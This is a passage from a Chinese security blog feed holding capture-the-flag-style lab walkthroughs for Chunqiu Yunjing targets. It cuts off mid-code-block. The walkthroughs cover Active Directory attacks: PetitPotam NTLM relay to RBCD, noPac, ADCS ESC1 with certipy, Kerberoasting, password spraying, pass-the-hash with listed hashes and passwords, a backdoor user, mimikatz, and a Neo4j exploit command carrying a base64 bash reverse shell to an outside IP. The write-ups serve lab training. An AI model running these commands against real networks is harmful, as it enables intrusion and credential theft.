 _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.11.6&#x27;</span><br><span class="line">[proxychains] Strict chain  ...  47.92.4.8:1236  ...  172.22.11.6:389  ...  OK</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: yangmei</span><br><span class="line">[c] Auth hash: 25e42ef4cc0ab6a8ff9e3edbbda91841</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2019 Server operating system </span><br><span class="line">[i] Domain SID: </span><br><span class="line">                    [+] S-1-5-21-3598443049-773813974-2432140268</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 0 </span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 10675199(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] XIAORANG-DC$  ==&gt;&gt;&gt;   Windows Server 2019 Standard  [10.0 (17763)]  ==&gt;&gt;&gt;  172.22.11.6 </span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 0 found</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 37 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 24 found</span><br><span class="line">[i] User with Mail: 0 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 22 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 2 found</span><br><span class="line">[i] Users with passwords not set to expire: 2 found</span><br><span class="line">[i] Domain Computers: 3 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 3 found</span><br><span class="line">[i] Groups: 49 found</span><br><span class="line">[i] Domain OUs: 2 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw </span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 0 found</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 0 found</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-07-22 12:39:44 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in /Volumes/T7mac/Tools/内网渗透/ADinfo</span><br><span class="line">[i] Execution took 1.570960417s</span><br></pre></td></tr></table></figure><p>通过上面的信息可以发现域内的MAQ=0，说明域内用户不能添加域机器进入域内,也就是说很多漏洞都没办法利用。看看大佬的博客</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 使用Bloodhound收集到的用户名组合获取到的密码/hashes组合爆破，没发现其他新用户</span><br><span class="line">2. MAQ = 0，加不了计算机</span><br><span class="line">3. 当前LDAP 没 TLS，远程也加不了计算机，impacket的addcomputer有两种方法samr和ldaps。samr受到MAQ = 0的限制，无法添加计算机；ldaps受到 没TLS + MAQ = 0 的限制</span><br><span class="line">4. 域控存在nopac，当前用户yangmei使用nopac没打死，并且对域内computer container没有createchild的ACL</span><br><span class="line">5. 域控存在nopac，当前用户yangmei对当前windows机器xr-desktop没WriteDacl权限，意味着无法修改SamAccountName</span><br><span class="line">6. 域内存在 DFscoerce 和 petitpotam，但是不存在CVE-2019-1040，因此放弃 DFscoerce，优先使用petitpotam</span><br><span class="line">7. NoPac exploit: [Ridter/noPac: Exploiting CVE-2021-42278 and CVE-2021-42287 to impersonate DA from standard domain user (github.com)](https://github.com/Ridter/noPac)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav </span><br><span class="line">proxychains crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309144645969.png" class=""><p>扫出来有webdav服务，然后去扫这个petitpotam洞一直超时，先打了再说。</p><p>具体就是要打NTLM Relay via WebDAV+Petitpotam的Coerce Authentication</p><p>参考这几篇文章<br><a href="https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/">https://whoamianony.top/posts/privilege-escalation-ntlmrelay2self-over-http-webdav/</a><br><a href="https://forum.butian.net/share/2220">https://forum.butian.net/share/2220</a><br><a href="https://forum.butian.net/share/1944">https://forum.butian.net/share/1944</a></p><p>这里有一个技巧,可以转发到本地</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ~/.ssh/id_ed25519 root@39.99.139.181 -D socksip:port -R \*:79:127.0.0.1:80</span><br><span class="line">nohup socat TCP-LISTEN:80,fork,bind=0.0.0.0 TCP:localhost:79 &amp;</span><br></pre></td></tr></table></figure><ul><li><p><code>ssh</code>：使用 SSH 连接远程服务器。</p></li><li><p><code>-i ~/.ssh/id_ed25519</code>：指定 SSH 私钥 <code>id_ed25519</code> 进行身份认证。</p></li><li><p><code>root@39.99.139.181</code>：以 <code>root</code> 用户身份连接 <code>39.99.139.181</code> 这台远程服务器。</p></li><li><p><code>-D socksip:port</code>：</p><ul><li><code>-D</code> 选项开启 <strong>SOCKS 代理</strong>，即在本地 <code>socksip:port</code> 上启动一个动态端口转发代理。</li><li>所有经由这个代理的流量都会通过 <code>39.99.139.181</code> 这台服务器转发，类似于 <strong>翻墙代理（SOCKS5 代理）</strong>。</li></ul></li><li><p><code>-R \*:79:127.0.0.1:80</code>：</p><ul><li><code>-R</code> 选项表示 <strong>远程端口转发</strong>。</li><li><code>\*:</code> 表示绑定到所有网卡（即允许任意 IP 访问这个端口）。</li><li><code>79:127.0.0.1:80</code> 表示：<ul><li><strong>远程服务器 (<code>39.99.139.181</code>) 的 <code>79</code> 端口</strong> 会转发到 <strong>本地（SSH 客户端所在机器）的 <code>127.0.0.1:80</code> 端口</strong>。</li></ul></li></ul></li><li><p><code>socat</code>：一个强大的网络工具，常用于端口转发和代理。</p></li><li><p><code>TCP-LISTEN:80,fork,bind=0.0.0.0</code>：</p><ul><li><code>TCP-LISTEN:80</code>：监听 <strong>本机 <code>80</code> 端口</strong>，等待 TCP 连接。</li><li><code>fork</code>：每次有新连接时，自动创建一个子进程处理连接（防止阻塞）。</li><li><code>bind=0.0.0.0</code>：监听 <strong>所有 IP（外部和本地）</strong> 的请求。</li></ul></li><li><p><code>TCP:localhost:79</code>：</p><ul><li>当收到 <strong>80 端口的请求</strong>，会将流量 <strong>转发到 <code>localhost:79</code> 端口</strong>。</li></ul></li></ul><img src="/post/8fbf5de0/IMAGE20250309152304811.png" class=""><h3 id="Ntlm-Relay-petitpotam">Ntlm Relay petitpotam</h3><p>此时已经转发成功了,接下来去开启本地监听80，然后通过efs强制认证到本机80，relay到dc的ldap，设置XR-DESKTOP到172.22.11.26的基于资源的约束委派。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user &#x27;xr-desktop$&#x27; --delegate-access</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后打petitpotam强制认证</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 PetitPotam.py -u yangmei -p &#x27;xrihGHgoNZQ&#x27; -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309153140243.png" class=""><h3 id="基于资源的约束委派">基于资源的约束委派</h3><p>然后直接用之前172.22.11.45上抓的机器账户XR-DESKTOP$哈希打172.22.11.26的RBCD</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">roxychains4 python3 getST.py -spn cifs/XR-LCM3AE8B.xiaorang.lab -impersonate administrator -hashes :0a124be3aa98d6f8499eb0ea8df3c355  xiaorang.lab/XR-Desktop\$ -dc-ip 172.22.11.6</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309154135188.png" class=""><p>然后导入ccache之后可以直接打pth</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br><span class="line">proxychains python3 psexec.py xiaorang.lab/administrator@XR-LCM3AE8B.xiaorang.lab -k -no-pass -target-ip 172.22.11.26 -codec gbk</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309153842613.png" class=""><img src="/post/8fbf5de0/IMAGE20250309154250256.png" class=""><h3 id="nopac提权">nopac提权</h3><p>添加个后门用户进行rdp</p><img src="/post/8fbf5de0/IMAGE20250309154558044.png" class=""><img src="/post/8fbf5de0/IMAGE20250309154718931.png" class=""><p>在rdp时有个账户在登录着，上传mimikatz抓去hash</p><img src="/post/8fbf5de0/IMAGE20250309155200417.png" class=""><p>看下信息</p><img src="/post/8fbf5de0/IMAGE20250309160954265.png" class=""><p>存在 MA_Admin组</p><img src="/post/8fbf5de0/IMAGE20250309161014288.png" class=""><p>zhanghui存在这个组里，对computer能够创建对象，能向域中添加机器账户，所以能打noPac</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 noPac.py xiaorang.lab/zhanghui -hashes &#x27;:1232126b24cdf8c9bd2f788a9d7c7ed1&#x27; -dc-ip 172.22.11.6 --impersonate Administrator -create-child -use-ldap -shell</span><br></pre></td></tr></table></figure><img src="/post/8fbf5de0/IMAGE20250309161512866.png" class=""><p>参考：<br><a href="https://www.cnblogs.com/-meditation-/articles/16619406.html">https://www.cnblogs.com/-meditation-/articles/16619406.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;先来看fscan的扫描结果&lt;/p&gt;
&lt;img src=&quot;/post/8fbf5de0/IMAGE20250309135115773.png&quot; class=&quot;&quot;&gt;
&lt;p&gt;看到开了8009 8080 端口先去看看web界面。&lt;/p</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Certify-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/51364caa.html"/>
    <id>https://oceanzbz.github.io/post/51364caa.html</id>
    <published>2025-03-08T09:28:03.000Z</published>
    <updated>2025-03-08T10:52:16.720Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>fscan 扫描下端口</p><img src="/post/51364caa/IMAGE20250308174254782.png" class=""><h2 id="log4j">log4j</h2><img src="/post/51364caa/IMAGE20250308174329178.png" class=""><p>存在这个服务，很像之前vulhub上的log4j的页面，其配置里也有log4j。</p><img src="/post/51364caa/IMAGE20250308174824071.png" class=""><img src="/post/51364caa/IMAGE20250308174801876.png" class=""><p>成功反弹shell,但是上来之后发现啥都干不了提权试试。</p><h2 id="grc-提权">grc 提权</h2><img src="/post/51364caa/IMAGE20250308175001149.png" class=""><p><code>sudo grc cat /root/flag/flag01.txt</code></p><img src="/post/51364caa/IMAGE20250308175046411.png" class=""><p>上传下代理和fsacn,先扫描下内网</p><h2 id="内网渗透">内网渗透</h2><img src="/post/51364caa/IMAGE20250308175445252.png" class=""><p>题目的标签中有个SMB而在扫描记录中又有一个fileserver，连一下试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 smbclient.py 172.22.9.47</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308180108256.png" class=""><img src="/post/51364caa/IMAGE20250308180205865.png" class=""><p>接着把上级目录下的文件下载一下。然后导入一下这个db数据库查看一下</p><img src="/post/51364caa/IMAGE20250308181048351.png" class=""><p>一堆用户名</p><img src="/post/51364caa/IMAGE20250308181100318.png" class=""><p>还有几个密码，喷洒下试试,两种方式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra -L user.txt -P pass 172.22.9.26 rdp</span><br><span class="line"></span><br><span class="line">proxychains4 crackmapexec smb 172.22.9.26 -u user -p pass -d xiaorang.lab</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308182001253.png" class=""><p>想着rdp一下发现都连不上去，看到flag02里有个提示spn的东西。</p><h3 id="kerberoasting攻击">kerberoasting攻击</h3><p>使用impacket脚本跑一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 GetUserSPNs.py -request -dc-ip 172.22.9.7 xiaorang.lab/zhangjian:i9XDE02pLVf</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308182816056.png" class=""><p>爆破下这两个hash</p><img src="/post/51364caa/IMAGE20250308182940440.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zhangxia:MyPass2@@6</span><br><span class="line">chenchen:@Passw0rd@</span><br></pre></td></tr></table></figure><p>然后再试试rdp看看行不行</p><img src="/post/51364caa/IMAGE20250308183813541.png" class=""><p>但是没有权限。</p><h3 id="adcs">adcs</h3><p>先枚举下有啥漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains certipy-ad find -u &#x27;liupeng@xiaorang.lab&#x27; -password &#x27;fiAzGwEMgTY&#x27; -dc-ip 172.22.9.7 -vulnerable -stdout</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Certificate Authorities</span><br><span class="line">  0</span><br><span class="line">    CA Name                             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    DNS Name                            : XIAORANG-DC.xiaorang.lab</span><br><span class="line">    Certificate Subject                 : CN=xiaorang-XIAORANG-DC-CA, DC=xiaorang, DC=lab</span><br><span class="line">    Certificate Serial Number           : 43A73F4A37050EAA4E29C0D95BC84BB5</span><br><span class="line">    Certificate Validity Start          : 2023-07-14 04:33:21+00:00</span><br><span class="line">    Certificate Validity End            : 2028-07-14 04:43:21+00:00</span><br><span class="line">    Web Enrollment                      : Disabled</span><br><span class="line">    User Specified SAN                  : Unknown</span><br><span class="line">    Request Disposition                 : Unknown</span><br><span class="line">    Enforce Encryption for Requests     : Unknown</span><br><span class="line">Certificate Templates</span><br><span class="line">  0</span><br><span class="line">    Template Name                       : XR Manager</span><br><span class="line">    Display Name                        : XR Manager</span><br><span class="line">    Certificate Authorities             : xiaorang-XIAORANG-DC-CA</span><br><span class="line">    Enabled                             : True</span><br><span class="line">    Client Authentication               : True</span><br><span class="line">    Enrollment Agent                    : False</span><br><span class="line">    Any Purpose                         : False</span><br><span class="line">    Enrollee Supplies Subject           : True</span><br><span class="line">    Certificate Name Flag               : EnrolleeSuppliesSubject</span><br><span class="line">    Enrollment Flag                     : PublishToDs</span><br><span class="line">                                          IncludeSymmetricAlgorithms</span><br><span class="line">    Private Key Flag                    : ExportableKey</span><br><span class="line">    Extended Key Usage                  : Encrypting File System</span><br><span class="line">                                          Secure Email</span><br><span class="line">                                          Client Authentication</span><br><span class="line">    Requires Manager Approval           : False</span><br><span class="line">    Requires Key Archival               : False</span><br><span class="line">    Authorized Signatures Required      : 0</span><br><span class="line">    Validity Period                     : 1 year</span><br><span class="line">    Renewal Period                      : 6 weeks</span><br><span class="line">    Minimum RSA Key Length              : 2048</span><br><span class="line">    Permissions</span><br><span class="line">      Enrollment Permissions</span><br><span class="line">        Enrollment Rights               : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Domain Users</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Authenticated Users</span><br><span class="line">      Object Control Permissions</span><br><span class="line">        Owner                           : XIAORANG.LAB\Administrator</span><br><span class="line">        Write Owner Principals          : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Dacl Principals           : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">        Write Property Principals       : XIAORANG.LAB\Domain Admins</span><br><span class="line">                                          XIAORANG.LAB\Enterprise Admins</span><br><span class="line">                                          XIAORANG.LAB\Administrator</span><br><span class="line">    [!] Vulnerabilities</span><br><span class="line">      ESC1                              : &#x27;XIAORANG.LAB\\Domain Users&#x27; and &#x27;XIAORANG.LAB\\Authenticated Users&#x27; can enroll, enrollee supplies subject and template allows client authentication</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>存在ESC1。先跟着别的师傅的思路打因为我不会。</p><p>先改一下hosts，要不然会超时。</p><h3 id="ESC1">ESC1</h3><p>首先申请 XR Manager 证书模版并伪造域管理员，得到administrator.pfx</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad req -u &#x27;liupeng@xiaorang.lab&#x27; -p &#x27;fiAzGwEMgTY&#x27; -target 172.22.9.7 -dc-ip 172.22.9.7 -ca &quot;xiaorang-XIAORANG-DC-CA&quot; -template &#x27;XR Manager&#x27; -upn administrator@xiaorang.lab</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308184557804.png" class=""><p>然后利用administrator.pfx证书获取 TGT 和 NTLM Hash</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 certipy-ad auth -pfx administrator.pfx -dc-ip 172.22.9.7</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308184656523.png" class=""><p>拿到域管的hash直接pth就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.7 -codec gbk</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308184841220.png" class=""><p>继续横道另一个机器上读取flag3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 python3 wmiexec.py -hashes :2f1b57eefb2d152196836b0516abea80 Administrator@172.22.9.26 -codec gbk</span><br></pre></td></tr></table></figure><img src="/post/51364caa/IMAGE20250308185215477.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;fscan 扫描下端口&lt;/p&gt;
&lt;img src=&quot;/post/51364caa/IMAGE20250308174254782.png&quot; class=&quot;&quot;&gt;
&lt;h2 id=&quot;log4j&quot;&gt;log4j&lt;/h2&gt;
&lt;img src</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>Time-春秋云镜</title>
    <link href="https://oceanzbz.github.io/post/28f71a4e.html"/>
    <id>https://oceanzbz.github.io/post/28f71a4e.html</id>
    <published>2025-03-08T06:01:44.000Z</published>
    <updated>2025-03-08T09:18:07.487Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集">信息收集</h2><p>还是用fscan 扫描下收集下端口</p><img src="/post/28f71a4e/IMAGE20250308155713899.png" class=""><p>发现开放了 7687端口，存在一个nday<br><a href="https://github.com/zwjjustdoit/CVE-2021-34371.jar">https://github.com/zwjjustdoit/CVE-2021-34371.jar</a></p><h2 id="Neo4j-RCE">Neo4j RCE</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar rhino_gadget.jar rmi://39.99.142.110:1337 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDEuNjMuMTIwLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure><img src="/post/28f71a4e/IMAGE20250308161039889.png" class=""><p>拿到shell,之后去用户目录下查找flag</p><img src="/post/28f71a4e/IMAGE20250308161152173.png" class=""><h2 id="内网渗透">内网渗透</h2><p>上传一个代理，和fscan 扫描下内网</p><img src="/post/28f71a4e/IMAGE20250308162353956.png" class=""><p>发现有个web服务，看看是啥</p><h3 id="sql注入">sql注入</h3><img src="/post/28f71a4e/IMAGE20250308162623353.png" class=""><p>貌似并没有泄漏啥版本信息，抓个包看看</p><img src="/post/28f71a4e/IMAGE20250308163145463.png" class=""><p>发现存在sql注入，上sqlmap跑一遍</p><p><code>proxychains sqlmap -r 1.post --dump</code></p><img src="/post/28f71a4e/IMAGE20250308163418409.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span 